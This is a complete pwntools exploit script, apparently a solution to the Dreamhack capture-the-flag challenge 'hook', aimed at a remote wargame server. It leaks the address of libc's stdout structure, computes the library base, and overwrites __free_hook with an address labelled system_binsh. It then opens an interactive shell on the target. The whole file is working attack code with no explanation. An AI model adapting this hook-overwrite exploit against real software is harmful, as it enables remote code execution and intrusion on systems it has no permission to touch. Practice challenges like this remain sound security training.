from pwn import *

context.log_level = 'debug'
context.binary = exe = ELF('./hook', checksec=False)

libc = ELF('./libc-2.23.so', checksec=False)

r = remote('host3.dreamhack.games', 8567)
#r = process(exe.path)


r.recvuntil(b'stdout: ')
stdout_leak = int(r.recvline()[:-1], 16)
libc.address = stdout_leak - libc.sym['_IO_2_1_stdout_']
free_hook = libc.sym['__free_hook']

system_binsh = 0x0000000000400a11

log.info("The address of libc: " + hex(libc.address))
log.info("The address of __free_hook: " + hex(free_hook))

payload = p64(free_hook) + p64(system_binsh)
r.sendlineafter(b'Size: ', b'11')
r.sendlineafter(b'Data: ', payload)
sleep(2)
r.interactive()